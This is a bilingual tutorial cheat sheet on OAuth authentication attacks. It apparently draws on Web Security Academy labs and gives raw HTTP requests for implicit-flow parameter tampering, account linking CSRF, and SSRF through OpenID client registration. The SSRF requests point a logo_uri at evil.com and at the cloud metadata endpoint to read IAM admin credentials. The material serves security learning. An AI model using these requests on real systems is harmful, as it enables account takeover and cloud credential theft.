OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user's account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application. This means users can fine-tune which data they want to share rather than having to hand over full control of their account to a third party.

The basic OAuth process is widely used to integrate third-party functionality that requires access to certain data from a user's account. For example, an application might use OAuth to request access to your email contacts list so that it can suggest people to connect with. However, the same mechanism is also used to provide third-party authentication services, allowing users to log in with an account that they have with a different website.

## 1. Principle

利用第三方登录绕过身份验证

### 1.1. Location

使用第三方登录的平台

## 2. Test

### 2.1. Implicit Flow

第三方登录时修改请求参数造成越权

```
POST /authenticate HTTP/2

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"lvaSEQ_sXB8nJsB9kzHhdTF_sayEy1Xr0BDsp4tQOHh"}
```

### 2.2. SSRF

目录扫描得到目标 OpenID Connect 的配置信息

```
https://oauth-server.net/.well-known/openid-configuration
```

分析配置信息得到客户端注册端点

```
"registration_endpoint": "https://oauth-server.net/reg"
```

根据 OpenID Connect 规范流程构造客户端注册请求, 可获取新的 `client_id` 

```
POST /reg HTTP/2
Host: oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```

回溯登录请求, 显示 Images 发现有一个请求是通过 `client_id` 获取 Logo 的

```
GET /client/v4r1g3puwcbv2jyboc0ic/logo HTTP/2
Host: oauth-server.net
```

根据 OpenID Connect 规范流程构造访问恶意网站的请求获取新的 `client_id` 

```
POST /reg HTTP/2
Host: oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "https://evil.com"
}
```

使用新的 `client_id` 获取 Logo, `evil.com` 接收到请求日志, 说明存在 SSRF

```
GET /client/5RDOzVqFMjYk6JRWdqbFi/logo HTTP/2
Host: oauth-server.net
```

构造访问元数据的请求获取新的 `client_id` 

```
POST /reg HTTP/2
Host: oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

使用新的 `client_id` 获取 Logo, 成功读取到元数据

```
GET /client/5RDOzVqFMjYk6JRWdqbFi/logo HTTP/2
Host: oauth-server.net
```

### 2.3. Profile Linking

CSRF 诱导目标绑定攻击者的第三方登录

```
GET /oauth-linking?code=HJYji9vVQKQyBspfa4Ge011IPmfUcvT4s9HErBPOXC2 HTTP/2
Host: web-security-academy.net
```

---

**References**

- [OAuth authentication](https://portswigger.net/web-security/oauth)
- [CWE-1390](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-1390)

